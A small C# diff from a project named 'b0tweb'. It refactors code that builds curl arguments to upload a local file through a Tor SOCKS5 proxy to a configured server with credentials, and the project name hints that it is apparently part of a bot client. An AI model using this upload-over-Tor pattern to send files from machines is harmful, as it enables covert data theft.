@@ -19,8 +19,9 @@ namespace b0tweb
         {
             string basePath = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
             string argument = String.Format(
-                 "--socks5-hostname {0}  -F \"files[]=@{1}\" {2}  --user {3}:{4}",
-                "localhost:9050", //TODO: Move this to tor proxy
+                 "--socks5-hostname {0}:{1}  -F \"files[]=@{2}\" {3}  --user {4}:{5}",
+                TorProxy.Host,
+                TorProxy.Port,
                 filePath,
                 Configuration.HTTPServer,
                 Configuration.HTTPUsername,
